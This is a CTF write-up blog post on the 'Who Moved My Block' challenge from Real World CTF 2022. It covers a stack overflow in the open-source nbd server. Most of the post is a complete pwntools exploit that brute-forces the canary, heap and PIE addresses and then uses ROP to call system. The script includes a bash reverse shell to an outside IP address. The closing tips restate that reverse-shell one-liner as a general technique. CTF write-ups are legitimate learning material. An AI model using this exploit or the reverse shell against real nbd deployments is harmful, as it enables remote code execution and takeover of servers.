---
title: Who Moved My Block-Real World Stack Overflow
date: 2022-01-23 16:22:21
tags: 
---
Who Moved My Block, rwctf 2022
<!--more-->

# Prelude

Real world CTF is my first CTF in 2022, I had a great time with my teammates@r3kapig! Especially thanks to @2019 @crazyman, we solved the challenge together!

This challenge is my first real-world challenge. Someone calls it “clone and pwn” challenge, which means we should clone the latest version of the project and pwn it with 0day vulnerability.

Also, nbd is a small project and we could finish the code review part quickly.

# Set-up

Project Link: [https://github.com/NetworkBlockDevice/nbd](https://github.com/NetworkBlockDevice/nbd)

Commit: 5750003711b8050bad3ddaf5196201ef419ce15d

Make:

```bash
./configure --enable-debug && \\
make && \\
make install
```

# Solution

The solution is similar to **CVE-2018-1160, Metatalk in Hitcon 2021.**

1. Read the source code and find the vulnerability.
2. I find two vulnerabilities one `Heap-Overflow` and one `Stack-Overflow`in function `handle-info` 
3. The `heap-overflow` is hard to use, cuz we need to construct the heap Fengshui carefully.
4. While the `Stack-Overflow` one is easy to use, we could get the addresses of pie/heap/canary by judging the statement of connection (crash or hang).
5. ROP to get a reversed shell

# Exp

```python
from code import interact
from distutils.dir_util import copy_tree
from re import sub
from pwn import *
import subprocess
#context.log_level = 'debug'
context.arch='amd64'
DEBUG = 0
if(DEBUG):
    ip = "0.0.0.0"
    port = 6666
else:
    ip = "47.242.113.232"
    port =49265
p = None
ru = lambda x: p.recvuntil(x)
rl = lambda  : p.recvline()
ra = lambda  : p.recvall()
rv = lambda x: p.recv(x)
sn = lambda x: p.send(x)
sl = lambda x: p.sendline(x) 
sa = lambda x,y: p.sendafter(x,y) 
def pow():
    ru('sha256("')
    tmp = ru('"')[:-1].decode()
    c1 = "gcc ./pow.c -lcrypto -o ppp".split(' ')
    c2 = f"./ppp {tmp}".split(' ')
    c3 = "rm ./ppp".split(' ')
    subp = subprocess.Popen(c1)
    subp.wait()
    print(c2)
    subp = subprocess.Popen(c2)
    res,_ = subp.communicate()
    subp = subprocess.Popen(c3)
    subp.wait()
    print(res,_)
def anum(n):
    sn(p32(n,endian='big'))
def NBD_OPT_EXPORT_NAME(payload):
    anum(1)
    anum(len(payload))
    sn(payload)
def NBD_OPT_LIST():#baned
    sn(p64(0x54504f4556414849))
    anum(3)
    anum(1)    
def NBD_OPT_STARTTLS(size,c):#Set stack
    anum(5)
    anum(size)
    sn(c)
def NBD_OPT_INFO(buf):
    anum(7)
    anum(len(buf)+4)
    anum(len(buf)+4)
    sn(buf)
    p.read()
    pad = b" "*0x10+b'''sleep 3;bash -c 'exec bash -i &>/dev/tcp/49.234.220.122/20191 <&1';'''*0x6
    sn(pad.ljust(len(buf)+4,b'\0'))
    sn(p16(0,endian='big'))
    p.readuntil("nown")
def single_req(base,guess):
    global p
    p = remote(ip,port)
    sa("OPT\x00\x03",p32(0))
    sn(p64(0x54504f4556414849))
    NBD_OPT_INFO(base+guess)
    p.read(timeout=1)
def req(base,length):
    res = b""
    global p
    for x in range(length):
        flag=0
        for _ in range(0x100):
            log.success(f"Trying Pos:{x}:{hex(_)}")
            try:
            #if(1):
                guess = _.to_bytes(1,'little')
                single_req(base+res,guess)
                res+=guess
                flag=1
                break
            except:
                p.close()
                continue
        if(not flag):
            return 0
        log.warning(hex(u64(res.ljust(8,b'\0'))))
    res = u64(res.ljust(8,b'\0'))
    log.warning(hex(res))
    input()
    return res
def canary():
    base=b"A"*(0x408)+b'\0'
    length=7
    return req(base,length)
def leak_heap():
    global p

    base = b"A"*(0x408)+ p64(canary_val) +b"\0"*0x18
    length = 6
    return req(base,length)
def leak_pie():
    global p
    base = b"A"*(0x408)+ p64(canary_val) +b"\0"*0x18
    base+= p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+b"\xea"
    length= 5
    return req(base,length)
def exploit(c):
    global p
    p = remote(ip,port)
    sa("OPT\x00\x03",p32(0))
    sn(p64(0x54504f4556414849))
    pay = b"A"*(0x408)+p64(canary_val)+b"\0"*0x18
    pay += p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+c
    NBD_OPT_INFO(pay)
    p.interactive()
if __name__ == "__main__":
    canary_val = canary()
    heap  = leak_heap()
    pie = leak_pie()-0x96ea

    ret = 0x000000000000301a+pie 
    rdi = 0x0000000000004a58+pie
    system = 0x3bb0+pie

    
    r = flat([
        ret,rdi,heap+0x100*2,system
    ])
    exploit(r)
```

# Skills

I learned some useful skills from my teammates:

1. Use sleep xxx; to judge if the remote server is running our command.
2. System function behave different as the shell. `bash -c 'exec bash -i &>/dev/tcp/<>ip address/<port> <&1';` could work well. Before attack remotely, we could test the command locally first `system(<cmd>)` .